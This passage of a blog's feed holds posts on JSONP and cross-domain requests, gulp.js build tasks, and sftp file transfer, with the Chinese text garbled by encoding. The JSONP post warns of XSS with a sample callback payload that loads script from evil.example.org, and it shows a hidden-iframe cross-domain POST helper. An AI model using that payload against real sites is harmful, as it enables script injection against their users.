class="line">&#125;;</span><br></pre></td></tr></table></figure><a id="more"></a><p>jsonp çš„ç¼ºç‚¹æ˜¯å®¹æ˜“å¯¼è‡´ XSS è·¨åŸŸæ”»å‡»ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.org/api.php?callback=$.getScript(&apos;//evil.example.org/xss.js&apos;);var dontcare=(</span><br></pre></td></tr></table></figure><p>ä¼šå˜ä¸ºè¿™æ ·ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.getScript(<span class="string">'http://evil.example.org/xss.js'</span>);<span class="keyword">var</span> dontcare= (&#123; ... &#125;);</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ jsonp åªèƒ½ç”¨åœ¨è‡ªå·±ä¿¡ä»»çš„ç«™ç‚¹ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªè·¨åŸŸçš„ post è¯·æ±‚ï¼Œä½†åªèƒ½ postï¼Œä¸èƒ½è·å¾— post è¿”å›çš„æ•°æ®ï¼ŒåŸç†æ˜¯åˆ›å»ºä¸€ä¸ª iframe è¿›è¡Œ postï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> crossDomainPost = <span class="function">(<span class="params">url, name, value</span>) =&gt;</span> &#123;</span><br><span class="line">    Element.prototype.remove = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.parentNode.removeChild(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">    <span class="keyword">let</span> uniqueString = <span class="string">'CHANGE_THIS_TO_SOME_UNIQUE_STRING'</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">    iframe.style.display = <span class="string">'none'</span>;</span><br><span class="line">    iframe.contentWindow.name = uniqueString;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">    form.target = uniqueString;</span><br><span class="line">    form.action = url;</span><br><span class="line">    form.method = <span class="string">'POST'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> input = <span class="built_in">document</span>.createElement(<span class="string">'input'</span>);</span><br><span class="line">    input.type = <span class="string">'hidden'</span>;</span><br><span class="line">    input.name = name;</span><br><span class="line">    input.value = value;</span><br><span class="line">    form.appendChild(input);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(form);</span><br><span class="line">    form.submit();</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        iframe.remove();</span><br><span class="line">        form.remove();</span><br><span class="line">    &#125;, <span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦å¤–ä¸€ä¸ªæ˜¯ postMessage è·¨åŸŸè¯·æ±‚ï¼Œè§£é‡Šè¯·çœ‹<a href="http://www.cnblogs.com/dolphinX/p/3464056.html" target="_blank" rel="noopener">html5 postMessageè§£å†³è·¨åŸŸã€è·¨çª—å£æ¶ˆæ¯ä¼ é€’</a></p><p>å‚è€ƒï¼š</p><ul><li><a href="http://stackoverflow.com/questions/8750469/apparent-jsonp-xss-vulnerability" target="_blank" rel="noopener">http://stackoverflow.com/questions/8750469/apparent-jsonp-xss-vulnerability</a></li><li><a href="http://stackoverflow.com/questions/298745/how-do-i-send-a-cross-domain-post-request-via-javascript" target="_blank" rel="noopener">http://stackoverflow.com/questions/298745/how-do-i-send-a-cross-domain-post-request-via-javascript</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»¥ä¸‹æ˜¯ä¸€ä¸ª ECMAScript6 ç‰ˆæœ¬çš„ JSONP æ–¹æ³•ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; jsonpLoad = &lt;span class=&quot;function&quot;&gt;(&lt;span class=&quot;params&quot;&gt;url&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; index = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; timeout = &lt;span class=&quot;number&quot;&gt;5000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Element.prototype.remove = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.parentNode.removeChild(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Promise&lt;/span&gt;(&lt;span class=&quot;function&quot;&gt;(&lt;span class=&quot;params&quot;&gt;resolve, reject&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; callback = &lt;span class=&quot;string&quot;&gt;`__callback&lt;span class=&quot;subst&quot;&gt;$&amp;#123;index++&amp;#125;&lt;/span&gt;`&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; timeoutID = &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.setTimeout(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        reject(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Error&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Request timeout.&#39;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;, timeout);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; script = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.createElement(&lt;span class=&quot;string&quot;&gt;&#39;script&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    script.type = &lt;span class=&quot;string&quot;&gt;&#39;text/javascript&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    script.async = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    script.src = &lt;span class=&quot;string&quot;&gt;`&lt;span class=&quot;subst&quot;&gt;$&amp;#123;url&amp;#125;&lt;/span&gt;&lt;span class=&quot;subst&quot;&gt;$&amp;#123;!~url.indexOf(&lt;span class=&quot;string&quot;&gt;&#39;?&#39;&lt;/span&gt;)? &lt;span class=&quot;string&quot;&gt;&#39;?&#39;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;&#39;&lt;/span&gt;&amp;#125;&lt;/span&gt;callback=&lt;span class=&quot;subst&quot;&gt;$&amp;#123;callback&amp;#125;&lt;/span&gt;`&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.querySelector(&lt;span class=&quot;string&quot;&gt;&#39;head&#39;&lt;/span&gt;).appendChild(script);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;[callback] = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;params&quot;&gt;res&lt;/span&gt; =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        script.remove();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.clearTimeout(timeoutID);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        resolve(res);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="csrf" scheme="http://youngdze.co/tags/csrf/"/>
    
      <category term="jsonp" scheme="http://youngdze.co/tags/jsonp/"/>
    
  </entry>
  
  <entry>
    <title>gulp.js åŸºç¡€</title>
    <link href="http://youngdze.co/2015/09/24/gulpjs-basis/"/>
    <id>http://youngdze.co/2015/09/24/gulpjs-basis/</id>
    <published>2015-09-24T01:40:09.000Z</published>
    <updated>2016-12-05T05:37:19.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æƒ³äº†è§£ <strong>gulpjs</strong> æ˜¯ä»€ä¹ˆå¯ä»¥çœ‹<a href="http://gulpjs.com/" target="_blank" rel="noopener">å®˜ç½‘</a>ã€‚</p></blockquote><h4 id="å¼•å…¥"><a href="#å¼•å…¥" class="headerlink" title="å¼•å…¥"></a>å¼•å…¥</h4><p>æˆ‘å·²ç»å†™å¥½ä¸€ä¸ªé¡¹ç›®çš„ <code>gulpfile.js</code>ï¼Œå…¶ä¸­ç”¨åˆ°çš„ <strong>gulpjs</strong> æ’ä»¶åŒ…æ‹¬ <code>gulp-less</code>ã€<code>gulp-coffee</code>ã€<code>gulp-util</code>ã€<code>webpack</code>ã€<code>gulp-uglify</code>ã€<code>gulp-rename</code>ã€‚</p><a id="more"></a><p>é¦–å…ˆå†™å¥½ <code>package.json</code>ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"gulp-example"</span>,</span><br><span class="line">    <span class="attr">"author"</span>: <span class="string">"youngdze"</span>,</span><br><span class="line">    <span class="attr">"devDependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"coffee-script"</span>: <span class="string">"^1.10.0"</span>,</span><br><span class="line">    <span class="attr">"gulp"</span>: <span class="string">"^3.9.0"</span>,</span><br><span class="line">    <span class="attr">"gulp-coffee"</span>: <span class="string">"^2.3.1"</span>,</span><br><span class="line">    <span class="attr">"gulp-jshint"</span>: <span class="string">"^1.11.2"</span>,</span><br><span class="line">    <span class="attr">"gulp-less"</span>: <span class="string">"^3.0.3"</span>,</span><br><span class="line">    <span class="attr">"gulp-rename"</span>: <span class="string">"^1.2.2"</span>,</span><br><span class="line">    <span class="attr">"gulp-uglify"</span>: <span class="string">"^1.4.0"</span>,</span><br><span class="line">    <span class="attr">"gulp-util"</span>: <span class="string">"^3.0.6"</span>,</span><br><span class="line">    <span class="attr">"gulp-watch"</span>: <span class="string">"^4.3.5"</span>,</span><br><span class="line">    <span class="attr">"webpack"</span>: <span class="string">"^1.12.1"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"prestart"</span>: <span class="string">"gulp"</span>,</span><br><span class="line">    <span class="attr">"start"</span>: <span class="string">"node --harmony server.js"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>npm install</code> å…ˆå®‰è£…ã€‚</p><p>å®‰è£…å®Œæˆååœ¨ <code>gulpfile.js</code> å¼•å…¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</span><br><span class="line"><span class="keyword">var</span> less = <span class="built_in">require</span>(<span class="string">'gulp-less'</span>);</span><br><span class="line"><span class="keyword">var</span> coffee = <span class="built_in">require</span>(<span class="string">'gulp-coffee'</span>);</span><br><span class="line"><span class="keyword">var</span> gutil = <span class="built_in">require</span>(<span class="string">'gulp-util'</span>);</span><br><span class="line"><span class="keyword">var</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</span><br><span class="line"><span class="keyword">var</span> webpackConfig = <span class="built_in">require</span>(<span class="string">'./webpack.config.js'</span>);</span><br><span class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>);</span><br><span class="line"><span class="keyword">var</span> rename = <span class="built_in">require</span>(<span class="string">'gulp-rename'</span>);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>webpack.config.js</code> éœ€è¦å…·ä½“äº†è§£è¯·å»çœ‹ <strong>webpack</strong> <a href="http://webpack.github.io/docs/configuration.html" target="_blank" rel="noopener">å®˜ç½‘è§£é‡Š</a>ï¼Œæˆ‘çš„å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    context:__dirname + <span class="string">"/public"</span>,</span><br><span class="line">    entry  :[<span class="string">"./src/getFruits.js"</span>, <span class="string">"./src/id3.js"</span>],</span><br><span class="line">    output :&#123;</span><br><span class="line">    path    :__dirname + <span class="string">"/public/build"</span>,</span><br><span class="line">    filename:<span class="string">"./bundle.js"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="gulp-task"><a href="#gulp-task" class="headerlink" title="gulp task"></a>gulp task</h4><p>å…¶å® <em>gulp task</em> çš„å†™æ³•åŸºæœ¬ä¸€æ ·çš„ï¼Œä¸è¿‡åƒ <strong>webpack</strong> çš„ä¸ä¸€æ ·ï¼Œä»¥ä¸‹ä¼šè¯´æ˜ã€‚</p><h5 id="gulp-less"><a href="#gulp-less" class="headerlink" title="gulp-less"></a>gulp-less</h5><p><code>gulp.src</code> è¯»å–å¼€å‘ç›®å½•ï¼Œ<code>pipe</code> æŒ‡æ˜ä»»åŠ¡ï¼Œ<code>gulp.dest</code> æŒ‡æ˜ä¿å­˜ç›®å½•ã€‚</p><p>åƒè¿™äº›æ’ä»¶è¯¦ç»†çš„é…ç½®å¯ä»¥å»å®ƒä»¬å®˜æ–¹æ–‡æ¡£æŸ¥çœ‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gulp.task(<span class="string">'less'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'public/src/*.less'</span>)</span><br><span class="line">    .pipe(less(&#123;</span><br><span class="line">        globalVars:&#123;</span><br><span class="line">        ENV: <span class="string">'dev'</span>,</span><br><span class="line">        version: <span class="number">10</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;))</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'public/build'</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h5 id="gulp-coffee"><a href="#gulp-coffee" class="headerlink" title="gulp-coffee"></a>gulp-coffee</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gulp.task(<span class="string">'coffee'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'public/src/*.coffee'</span>)</span><br><span class="line">    .pipe(coffee(&#123;<span class="attr">bare</span>: <span class="literal">true</span>&#125;))</span><br><span class="line">    .on(<span class="string">'error'</span>, gutil.log)</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'public/src'</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h5 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h5><p><strong>webpack</strong> æ²¡æœ‰å¯¹åº”çš„ <strong>gulpjs</strong> æŸ¥çœ‹ï¼Œæ‰€ä»¥è¿™é‡Œç”¨çš„æ˜¯ <strong>webpack</strong> å®˜æ–¹æä¾›çš„å†™æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gulp.task(<span class="string">'webpack'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"> callback </span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> webpack(webpackConfig, <span class="function"><span class="keyword">function</span>(<span class="params"> err, stats </span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(err) <span class="keyword">throw</span> <span class="keyword">new</span> gutil.PluginError(<span class="string">'webpack'</span>, err);</span><br><span class="line">    gutil.log(<span class="string">'[webpack]'</span>, stats.toString(&#123;&#125;));</span><br><span class="line">    callback();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h5 id="gulp-uglify"><a href="#gulp-uglify" class="headerlink" title="gulp-uglify"></a>gulp-uglify</h5><p>è¿™é‡Œæ˜¯å‹ç¼©åŠŸèƒ½ï¼ŒåŒ…æ‹¬ç”¨ <code>gulp-rename</code> ä¿®æ”¹ç”Ÿæˆæ–‡ä»¶çš„åç¼€ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gulp.task(<span class="string">'compress'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'public/build/bundle.js'</span>)</span><br><span class="line">    .pipe(uglify())</span><br><span class="line">    .pipe(rename(&#123;</span><br><span class="line">        extname:<span class="string">'.min.js'</span></span><br><span class="line">    &#125;))</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'public/build'</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="default"><a href="#default" class="headerlink" title="default"></a>default</h4><p>å¦‚æœæ²¡æœ‰å†™å¥½ <code>gulp.task(&#39;default&#39;)</code> å°±è¦æŒ‡å®š <code>gulp</code> è¿è¡Œçš„å‚æ•°ï¼Œæ¯”å¦‚ <code>gulp compress</code>ï¼Œå†™å¥½åªè¦ <code>gulp</code> å³å¯ç»Ÿä¸€æ‰§è¡Œï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gulp.task(<span class="string">'default'</span>, [<span class="string">'less'</span>, <span class="string">'coffee'</span>, <span class="string">'webpack'</span>, <span class="string">'compress'</span>], <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    gulp.watch(<span class="string">'public/src/*.less'</span>, [<span class="string">'less'</span>]);</span><br><span class="line">    gulp.watch(<span class="string">'public/src/*.coffee'</span>, [<span class="string">'coffee'</span>]);</span><br><span class="line">    gulp.watch(<span class="string">'public/src/*.js'</span>, [<span class="string">'webpack'</span>]);</span><br><span class="line">    gulp.watch(<span class="string">'public/build/bundle.js'</span>, [<span class="string">'compress'</span>]);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;æƒ³äº†è§£ &lt;strong&gt;gulpjs&lt;/strong&gt; æ˜¯ä»€ä¹ˆå¯ä»¥çœ‹&lt;a href=&quot;http://gulpjs.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;å®˜ç½‘&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;å¼•å…¥&quot;&gt;&lt;a href=&quot;#å¼•å…¥&quot; class=&quot;headerlink&quot; title=&quot;å¼•å…¥&quot;&gt;&lt;/a&gt;å¼•å…¥&lt;/h4&gt;&lt;p&gt;æˆ‘å·²ç»å†™å¥½ä¸€ä¸ªé¡¹ç›®çš„ &lt;code&gt;gulpfile.js&lt;/code&gt;ï¼Œå…¶ä¸­ç”¨åˆ°çš„ &lt;strong&gt;gulpjs&lt;/strong&gt; æ’ä»¶åŒ…æ‹¬ &lt;code&gt;gulp-less&lt;/code&gt;ã€&lt;code&gt;gulp-coffee&lt;/code&gt;ã€&lt;code&gt;gulp-util&lt;/code&gt;ã€&lt;code&gt;webpack&lt;/code&gt;ã€&lt;code&gt;gulp-uglify&lt;/code&gt;ã€&lt;code&gt;gulp-rename&lt;/code&gt;ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="NodeJS" scheme="http://youngdze.co/categories/NodeJS/"/>
    
    
      <category term="gulpjs" scheme="http://youngdze.co/tags/gulpjs/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨ sftp ä¸æœåŠ¡å™¨è¿›è¡Œæ–‡ä»¶ä¼ è¾“</title>
    <link href="http://youngdze.co/2015/09/14/use-sftp-transfer-files-with-remote-server/"/>
    <id>http://youngdze.co/2015/09/14/use-sftp-transfer-files-with-remote-server/</id>
    <published>2015-09-14T02:01:04.000Z</published>
    <updated>2016-12-05T05:37:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ <strong>sftp</strong> ä¸æœåŠ¡å™¨è¿›è¡Œæ–‡ä»¶ä¼ è¾“æ¯” <strong>ftp</strong> è¦å®‰å…¨ã€‚</p><h4 id="ç™»é™†"><a href="#ç™»é™†" class="headerlink" title="ç™»é™†"></a>ç™»é™†</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sftp username@remote_hostname_or_IP</span><br></pre></td></tr></table></figure><a id="more"></a><h4 id="æœåŠ¡å™¨æ“ä½œ"><a href="#æœåŠ¡å™¨æ“ä½œ" class="headerlink" title="æœåŠ¡å™¨æ“ä½œ"></a>æœåŠ¡å™¨æ“ä½œ</h4><p><strong>sftp</strong> åœ¨æœåŠ¡å™¨çš„æ“ä½œå’Œ <strong>ssh</strong> åœ¨æœåŠ¡å™¨çš„æ“ä½œæ˜¯ä¸€æ ·çš„ï¼Œéƒ½å¯ä»¥ç”¨ <code>ls</code>, <code>pwd</code>, <code>cd</code> ç­‰å‘½ä»¤ã€‚</p><h4 id="æœ¬åœ°æ“ä½œ"><a href="#æœ¬åœ°æ“ä½œ" class="headerlink" title="æœ¬åœ°æ“ä½œ"></a>æœ¬åœ°æ“ä½œ</h4><p><strong>sftp</strong> æ“ä½œæœ¬åœ°å¯ä»¥åœ¨å‘½ä»¤å‰åŠ ä¸ª <code>l</code> è¡¨ç¤º <em>local</em>ï¼Œæ¯”å¦‚ <code>ls</code> å°±è¦ <code>lls</code>ï¼Œ<code>mkdir</code> ç”¨ <code>lmkdir</code>ã€‚ ä¹Ÿå¯ä»¥è¾“å…¥ <code>!</code> è¿›å…¥æœ¬åœ° <em>shell</em> æ“ä½œï¼Œä½¿ç”¨ <code>exit</code> é€€å‡ºã€‚</p><h4 id="ä¸Šä¼ "><a href="#ä¸Šä¼ " class="headerlink" title="ä¸Šä¼ "></a>ä¸Šä¼ </h4><p>ä¸Šä¼ å‘½ä»¤ä¸ºï¼š</p><figure class="highlight sh"><table><tr><td 